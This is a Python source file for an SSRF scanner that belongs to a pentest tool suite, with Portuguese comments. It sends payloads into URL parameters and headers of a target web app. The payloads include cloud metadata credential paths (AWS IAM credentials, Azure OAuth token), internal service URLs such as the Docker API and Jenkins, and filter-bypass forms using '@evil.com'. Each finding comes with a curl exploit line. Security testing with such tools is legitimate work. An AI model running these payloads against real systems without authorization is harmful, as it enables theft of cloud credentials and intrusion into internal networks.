#!/usr/bin/env python3

"""Modulo de deteccao de SSRF (Server-Side Request Forgery).



Testa se o servidor e vulneravel a SSRF via parametros com URL:

  - Endpoints internos (localhost, 127.0.0.1, 0.0.0.0, [::1])

  - Cloud metadata (AWS 169.254.169.254, GCP, Azure)

  - Bypass de filtros (decimal IP, octal IP, IPv6, URL encoding)

  - Headers de deteccao (X-Forwarded-For, X-Real-IP)



Fluxo:

  1. Identifica parametros que aceitam URLs

  2. Envia payloads internos em cada parametro

  3. Compara respostas (status, tamanho, tempo, conteudo)

  4. Classifica: vulnerable, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import time
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.ssrfdetect")


_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["localhost", "private_ip", "loopback", "metadata"],
    "internal": ["internal_service", "database", "admin_panel", "cloud_metadata"],
    "bypass": ["decimal_ip", "octal_ip", "ipv6", "url_encoded", "double_url"],
    "cloud": ["aws_metadata", "gcp_metadata", "azure_metadata", "digital_ocean"],
    "header": ["xff_sspoof", "x_real_ip", "x_original_url", "forwarded_for"],
}


_URL_PARAMS_DEFAULT: list[str] = [
    "url",
    "link",
    "href",
    "src",
    "dest",
    "destination",
    "redirect",
    "redirect_url",
    "redirect_uri",
    "next",
    "return",
    "return_to",
    "site",
    "page",
    "path",
    "file",
    "load",
    "fetch",
    "get",
    "pull",
    "proxy",
    "target",
    "uri",
    "document",
    "image",
]


def _load_ssrf_params() -> list[str]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "ssrf_detect", default={"url_params": _URL_PARAMS_DEFAULT}
    )
    return data.get("url_params", _URL_PARAMS_DEFAULT)


_URL_PARAMS = _load_ssrf_params()


_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, str]] = [
    ("localhost_80", "http://127.0.0.1:80", "response"),
    ("localhost_443", "http://127.0.0.1:443", "response"),
    ("localhost_8080", "http://127.0.0.1:8080", "response"),
    ("localhost_3000", "http://127.0.0.1:3000", "response"),
    ("localhost_8443", "http://127.0.0.1:8443", "response"),
    ("private_10", "http://10.0.0.1", "response"),
    ("private_172", "http://172.16.0.1", "response"),
    ("private_192", "http://192.168.1.1", "response"),
    ("loopback", "http://[::1]", "response"),
    ("metadata_aws", "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("metadata_gcp", "http://metadata.google.internal/computeMetadata/v1/", "metadata"),
    (
        "metadata_azure",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "compute",
    ),
    ("zero_ip", "http://0.0.0.0", "response"),
    ("decimal_ip", "http://2130706433", "response"),
    ("hex_ip", "http://0x7f000001", "response"),
]


_INTERNAL_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "internal_mysql",
        "mysql://root:password@127.0.0.1:3306/",
        ["mysql", "access_denied"],
    ),
    ("internal_redis", "redis://127.0.0.1:6379/", ["redis", "connection"]),
    ("internal_mongodb", "mongodb://127.0.0.1:27017/", ["mongodb", "connection"]),
    (
        "internal_postgres",
        "postgresql://user:pass@127.0.0.1:5432/",
        ["postgresql", "connection"],
    ),
    ("internal_elasticsearch", "http://127.0.0.1:9200/", ["cluster_name", "elastic"]),
    ("internal_kafka", "http://127.0.0.1:9092/", ["kafka", "connection"]),
    ("internal_etcd", "http://127.0.0.1:2379/", ["etcd", "key"]),
    ("internal_docker", "http://127.0.0.1:2375/containers/json", ["Id", "Image"]),
    ("internal_jenkins", "http://127.0.0.1:8080/api/json", ["jobs", "primaryView"]),
    ("internal_gitlab", "http://127.0.0.1:80/api/v4/projects", ["gitlab", "project"]),
]


_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, str]] = [
    ("decimal_localhost", "http://2130706433", "response"),
    ("decimal_127", "http://2130706433:80", "response"),
    ("octal_localhost", "http://0177.0.0.1", "response"),
    ("hex_localhost", "http://0x7f000001", "response"),
    ("ipv6_localhost", "http://[::1]", "response"),
    ("ipv6_0", "http://[0:0:0:0:0:0:0:1]", "response"),
    ("url_encoded_dot", "http://127%2e0%2e0%2e1", "response"),
    ("double_encoded_dot", "http://127%252e0%252e0%252e1", "response"),
    ("no_scheme", "127.0.0.1", "response"),
    ("scheme_bypass", "//127.0.0.1", "response"),
    ("at_bypass", "http://127.0.0.1@evil.com", "response"),
    ("backslash", "http://127.0.0.1\\@evil.com", "response"),
    ("tab_injection", "http://127.0.0.1\t@evil.com", "response"),
    ("newline_injection", "http://127.0.0.1%0a@evil.com", "response"),
    ("port_redirect", "http://127.0.0.1:80@evil.com", "response"),
]


_CLOUD_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "aws_metadata_token",
        "http://169.254.169.254/latest/api/token",
        ["ami-id", "instance-id"],
    ),
    (
        "aws_metadata_latest",
        "http://169.254.169.254/latest/meta-data/",
        ["ami-id", "instance-id"],
    ),
    (
        "aws_metadata_user_data",
        "http://169.254.169.254/latest/user-data/",
        ["user-data"],
    ),
    (
        "aws_metadata_iam",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ["credentials"],
    ),
    (
        "gcp_metadata",
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        ["metadata"],
    ),
    (
        "gcp_project",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ["project"],
    ),
    (
        "azure_metadata",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ["compute"],
    ),
    (
        "azure_token",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ["access_token"],
    ),
    ("digital_ocean", "http://169.254.169.254/metadata/v1/", ["digitalocean"]),
    ("kubernetes", "https://kubernetes.default.svc/api/v1/namespaces", ["metadata"]),
]


def _load_ssrf_payloads(key: str, default: list[tuple]) -> list[tuple]:
    from mytools.data import load_payloads

    data = load_payloads("web", "ssrf_detect", default={key: default})
    raw = data.get(key, default)
    if not isinstance(raw, list):
        return default
    return [tuple(p) if isinstance(p, list) else p for p in raw]


_DETECT_PAYLOADS = _load_ssrf_payloads("detect_payloads", _DETECT_PAYLOADS_DEFAULT)
_INTERNAL_PAYLOADS = _load_ssrf_payloads(
    "internal_payloads", _INTERNAL_PAYLOADS_DEFAULT
)
_BYPASS_PAYLOADS = _load_ssrf_payloads("bypass_payloads", _BYPASS_PAYLOADS_DEFAULT)
_CLOUD_PAYLOADS = _load_ssrf_payloads("cloud_payloads", _CLOUD_PAYLOADS_DEFAULT)


_HEADER_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    ("xff_localhost", "X-Forwarded-For", "127.0.0.1", ["response"]),
    ("xff_private", "X-Forwarded-For", "10.0.0.1", ["response"]),
    ("x_real_ip", "X-Real-IP", "127.0.0.1", ["response"]),
    ("x_original_url", "X-Original-URL", "/admin", ["admin", "dashboard"]),
    ("x_rewrite_url", "X-Rewrite-URL", "/admin", ["admin", "dashboard"]),
    ("forwarded", "Forwarded", "for=127.0.0.1", ["response"]),
    ("x_client_ip", "X-Client-IP", "127.0.0.1", ["response"]),
    ("cf_connecting_ip", "CF-Connecting-IP", "127.0.0.1", ["response"]),
]


@dataclass(frozen=True, slots=True)
class SSRFAttempt:
    """Tentativa individual de SSRF."""

    technique: str

    category: str

    url: str

    payload: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    time_baseline: float

    time_test: float

    status_changed: bool

    size_changed: bool

    time_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class SSRFResult:
    """Resultado consolidado do scan de SSRF."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[SSRFAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


async def _test_baseline(
    client: httpx.AsyncClient,
    url: str,
) -> tuple[int, int, bytes, float]:
    """Envia requisicao baseline para obter resposta de referencia."""

    start = time.monotonic()

    try:
        resp = await client.get(url, follow_redirects=False)

        elapsed = time.monotonic() - start

        return resp.status_code, len(resp.content), resp.content, elapsed

    except httpx.RequestError:
        return 0, 0, b"", 0.0


def _check_ssrf_response(
    body: bytes,
    status: int,
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica SSRF bem-sucedido."""

    text = body.decode("utf-8", errors="ignore").lower()

    if status == 0:
        return False

    return any(indicator.lower() in text for indicator in indicators)


def _usable_indicators(indicators: list[str]) -> list[str]:
    """Retorna apenas indicadores utilizaveis (descarta o marker generico)."""

    return [ind for ind in indicators if ind and ind.lower() != "response"]


def _ssrf_vuln(
    body: bytes,
    status: int,
    baseline_body: bytes,
    baseline_status: int,
    indicators: list[str],
    status_changed: bool,
    size_changed: bool,
) -> bool:
    """Decide se a tentativa e vulneravel.

    Com indicador utilizavel: exige o indicador no corpo do teste E ausente no
    baseline (evita falso positivo em paginas dinamicas). Sem indicador
    utilizavel: recorre a diff estavel de baseline (status + tamanho).
    """

    usable = _usable_indicators(indicators)

    if usable:
        return _check_ssrf_response(body, status, usable) and not _check_ssrf_response(
            baseline_body, baseline_status, usable
        )

    return status_changed and size_changed


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes, float],
) -> list[SSRFAttempt]:
    """Testa SSRF basico com payloads de deteccao."""

    parsed = urlparse(base_url)

    original_params = parse_qs(parsed.query, keep_blank_values=True)

    attempts: list[SSRFAttempt] = []

    status_base, size_base, base_body, time_base = baseline

    for param in _URL_PARAMS[:8]:
        for name, payload, indicator in _DETECT_PAYLOADS:
            new_params = {
                k: v[0] if isinstance(v, list) else v
                for k, v in original_params.items()
            }

            new_params[param] = payload

            new_query = urlencode(new_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=new_query))

            start = time.monotonic()

            try:
                resp = await client.get(test_url, follow_redirects=False)

                elapsed = time.monotonic() - start

                status_test = resp.status_code

                size_test = len(resp.content)

                status_changed = status_test != status_base

                size_changed = abs(size_test - size_base) > 100

                time_changed = elapsed > time_base * 2 and elapsed > 1.0

                vuln = _ssrf_vuln(
                    resp.content,
                    status_test,
                    base_body,
                    status_base,
                    [indicator],
                    status_changed,
                    size_changed,
                )

                attempts.append(
                    SSRFAttempt(
                        technique=f"{name}_{param}",
                        category="detect",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=status_changed,
                        size_changed=size_changed,
                        time_changed=time_changed,
                        vulnerable=vuln,
                        details=f"Param {param}: {name}"
                        + (" -> changed" if vuln else ""),
                        error="",
                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
                        if vuln
                        else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as exc:
                elapsed = time.monotonic() - start

                attempts.append(
                    SSRFAttempt(
                        technique=f"{name}_{param}",
                        category="detect",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=False,
                        size_changed=False,
                        time_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


async def _test_internal(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes, float],
) -> list[SSRFAttempt]:
    """Testa SSRF contra servicos internos."""

    parsed = urlparse(base_url)

    original_params = parse_qs(parsed.query, keep_blank_values=True)

    attempts: list[SSRFAttempt] = []

    status_base, size_base, base_body, time_base = baseline

    for param in _URL_PARAMS[:5]:
        for name, payload, indicators in _INTERNAL_PAYLOADS:
            new_params = {
                k: v[0] if isinstance(v, list) else v
                for k, v in original_params.items()
            }

            new_params[param] = payload

            new_query = urlencode(new_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=new_query))

            start = time.monotonic()

            try:
                resp = await client.get(test_url, follow_redirects=False)

                elapsed = time.monotonic() - start

                status_test = resp.status_code

                size_test = len(resp.content)

                detected = _check_ssrf_response(resp.content, status_test, indicators)

                status_changed = status_test != status_base

                size_changed_flag = size_changed(size_test, size_base)

                vuln = _ssrf_vuln(
                    resp.content,
                    status_test,
                    base_body,
                    status_base,
                    indicators,
                    status_changed,
                    size_changed_flag,
                )

                attempts.append(
                    SSRFAttempt(
                        technique=f"{name}_{param}",
                        category="internal",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=status_changed,
                        size_changed=size_changed_flag,
                        time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                        vulnerable=vuln,
                        details=f"Param {param}: {name}"
                        + (" -> FOUND" if detected else ""),
                        error="",
                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
                        if vuln
                        else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as exc:
                elapsed = time.monotonic() - start

                attempts.append(
                    SSRFAttempt(
                        technique=f"{name}_{param}",
                        category="internal",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=False,
                        size_changed=False,
                        time_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


def size_changed(size_test: int, size_base: int) -> bool:
    """Verifica se o tamanho mudou significativamente."""

    return abs(size_test - size_base) > 100


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes, float],
) -> list[SSRFAttempt]:
    """Testa bypass de filtros SSRF."""

    parsed = urlparse(base_url)

    original_params = parse_qs(parsed.query, keep_blank_values=True)

    attempts: list[SSRFAttempt] = []

    status_base, size_base, base_body, time_base = baseline

    for param in _URL_PARAMS[:5]:
        for name, payload, indicator in _BYPASS_PAYLOADS:
            new_params = {
                k: v[0] if isinstance(v, list) else v
                for k, v in original_params.items()
            }

            new_params[param] = payload

            new_query = urlencode(new_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=new_query))

            start = time.monotonic()

            try:
                resp = await client.get(test_url, follow_redirects=False)

                elapsed = time.monotonic() - start

                status_test = resp.status_code

                size_test = len(resp.content)

                status_changed_flag = status_test != status_base

                size_changed_flag = size_changed(size_test, size_base)

                time_changed_flag = elapsed > time_base * 2 and elapsed > 1.0

                vuln = _ssrf_vuln(
                    resp.content,
                    status_test,
                    base_body,
                    status_base,
                    [indicator],
                    status_changed_flag,
                    size_changed_flag,
                )

                attempts.append(
                    SSRFAttempt(
                        technique=f"bypass_{name}_{param}",
                        category="bypass",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=status_changed_flag,
                        size_changed=size_changed_flag,
                        time_changed=time_changed_flag,
                        vulnerable=vuln,
                        details=f"Bypass {param}: {name}"
                        + (" -> changed" if vuln else ""),
                        error="",
                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
                        if vuln
                        else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as exc:
                elapsed = time.monotonic() - start

                attempts.append(
                    SSRFAttempt(
                        technique=f"bypass_{name}_{param}",
                        category="bypass",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=False,
                        size_changed=False,
                        time_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


async def _test_cloud(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes, float],
) -> list[SSRFAttempt]:
    """Testa SSRF contra cloud metadata endpoints."""

    parsed = urlparse(base_url)

    original_params = parse_qs(parsed.query, keep_blank_values=True)

    attempts: list[SSRFAttempt] = []

    status_base, size_base, base_body, time_base = baseline

    for param in _URL_PARAMS[:5]:
        for name, payload, indicators in _CLOUD_PAYLOADS:
            new_params = {
                k: v[0] if isinstance(v, list) else v
                for k, v in original_params.items()
            }

            new_params[param] = payload

            new_query = urlencode(new_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=new_query))

            start = time.monotonic()

            try:
                resp = await client.get(test_url, follow_redirects=False)

                elapsed = time.monotonic() - start

                status_test = resp.status_code

                size_test = len(resp.content)

                detected = _check_ssrf_response(resp.content, status_test, indicators)

                status_changed = status_test != status_base

                size_changed_flag = size_changed(size_test, size_base)

                vuln = _ssrf_vuln(
                    resp.content,
                    status_test,
                    base_body,
                    status_base,
                    indicators,
                    status_changed,
                    size_changed_flag,
                )

                attempts.append(
                    SSRFAttempt(
                        technique=f"cloud_{name}_{param}",
                        category="cloud",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=status_changed,
                        size_changed=size_changed_flag,
                        time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                        vulnerable=vuln,
                        details=f"Cloud {param}: {name}"
                        + (f" -> FOUND={indicators[0]}" if detected else ""),
                        error="",
                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
                        if vuln
                        else "",
                        tool="curl",
                    )
                )

            except httpx.RequestError as exc:
                elapsed = time.monotonic() - start

                attempts.append(
                    SSRFAttempt(
                        technique=f"cloud_{name}_{param}",
                        category="cloud",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        time_baseline=time_base,
                        time_test=elapsed,
                        status_changed=False,
                        size_changed=False,
                        time_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


async def _test_header(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes, float],
) -> list[SSRFAttempt]:
    """Testa SSRF via headers HTTP."""

    attempts: list[SSRFAttempt] = []

    status_base, size_base, _, time_base = baseline

    for name, header, payload, indicators in _HEADER_PAYLOADS:
        start = time.monotonic()

        try:
            resp = await client.get(
                base_url,
                headers={header: payload},
                follow_redirects=False,
            )

            elapsed = time.monotonic() - start

            status_test = resp.status_code

            size_test = len(resp.content)

            detected = _check_ssrf_response(resp.content, status_test, indicators)

            vuln = (
                detected
                or status_test != status_base
                or size_changed(size_test, size_base)
            )

            attempts.append(
                SSRFAttempt(
                    technique=f"header_{name}",
                    category="header",
                    url=base_url,
                    payload=f"{header}: {payload}",
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    time_baseline=time_base,
                    time_test=elapsed,
                    status_changed=status_test != status_base,
                    size_changed=size_changed(size_test, size_base),
                    time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                    vulnerable=vuln,
                    details=f"Header {header}: {name}"
                    + (" -> FOUND" if detected else ""),
                    error="",
                    exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
                    if vuln
                    else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            elapsed = time.monotonic() - start

            attempts.append(
                SSRFAttempt(
                    technique=f"header_{name}",
                    category="header",
                    url=base_url,
                    payload=f"{header}: {payload}",
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    time_baseline=time_base,
                    time_test=elapsed,
                    status_changed=False,
                    size_changed=False,
                    time_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                )
            )

    return attempts


def print_results(result: SSRFResult) -> None:
    """Exibe resultados formatados."""

    tls_tag = (
        color("[HTTPS]", Cyber.GREEN, Cyber.BOLD)
        if result.tls
        else color("[HTTP]", Cyber.YELLOW)
    )

    print(color("\n" + "=" * 60, Cyber.GRAY))

    print(color("  SSRF (Server-Side Request Forgery) SCANNER", Cyber.RED, Cyber.BOLD))

    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Alvo:       {result.target}", Cyber.CYAN))

    print(color(f"  TLS:        {tls_tag}", Cyber.WHITE))

    print(
        color(
            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )

    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques

    if vuln_techs:
        print(
            color(
                f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD
            )
        )

        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))

            a = next((a for a in result.attempts if a.technique == tech), None)

            if a:
                print_exploit_info(a.exploit, a.tool)

        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))

    else:
        print(color("\n  [+] Nenhum SSRF detectado", Cyber.GREEN, Cyber.BOLD))

        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues

    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))

        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]

    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))

        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan SSRF."""

    tls = target.lower().startswith("https")

    client = create_async_client(timeout=timeout, proxy=proxy)

    try:
        logger.info("Conectando a %s...", target)

        baseline = await _test_baseline(client, target)

        if baseline[0] == 0:
            logger.error("Falha ao conectar no alvo")

            return 1

        logger.info("Baseline: %d (%d bytes)", baseline[0], baseline[1])

        run_categories = categories or list(_CATEGORY_MAP.keys())

        all_attempts: list[SSRFAttempt] = []

        coros = []

        for cat in run_categories:
            if cat == "detect":
                coros.append(_test_detect(client, target, baseline))

            elif cat == "internal":
                coros.append(_test_internal(client, target, baseline))

            elif cat == "bypass":
                coros.append(_test_bypass(client, target, baseline))

            elif cat == "cloud":
                coros.append(_test_cloud(client, target, baseline))

            elif cat == "header":
                coros.append(_test_header(client, target, baseline))

        if coros:
            for r in await run_concurrent(coros, concurrency):
                if isinstance(r, list):
                    all_attempts.extend(r)

        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]

        blocked = [
            a.technique for a in all_attempts if not a.vulnerable and not a.error
        ]

        issues: list[str] = [
            f"VULN: {att.technique} - {att.details}"
            for att in all_attempts
            if att.vulnerable
        ]

        overall = "vulnerable" if vuln_techs else "secure"

        result = SSRFResult(
            target=target,
            baseline_status=baseline[0],
            baseline_size=baseline[1],
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked,
            issues=issues,
            overall_status=overall,
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        logger.info(
            "SSRF scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )

        return 1 if vuln_techs else 0

    finally:
        await client.aclose()


banner_art = create_banner(
    r"""

     _____ _____ ____  __  __ _   _    _    _

    / ____/ ____|  _ \|  \/  | | | |  / \  | |

   | (___| (___ | |_) | |\/| | | | | / _ \ | |

    \___ \\___ \|  _ <| |  | | | | |/ ___ \| |___

    ____) |___) | |_) | |__| | |_| /_/ _ \ \_____|

   |_____/_____/|____/|______|____/_/ ___\_\_____|

                                        |_|

    """,
    "SSRF — detecta Server-Side Request Forgery em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""

    parser = argparse.ArgumentParser(
        prog="mytools-ssrfdetect",
        description="SSRF — detecta Server-Side Request Forgery em web apps",
    )

    parser.add_argument("url", help="URL alvo (ex: https://example.com)")

    parser.add_argument(
        "-c",
        "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )

    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan SSRF a partir de argumentos parseados."""

    init_scanner(args)

    logger.info("SSRF scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None):
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="ssrf> ",
        description="SSRF interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c cloud\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
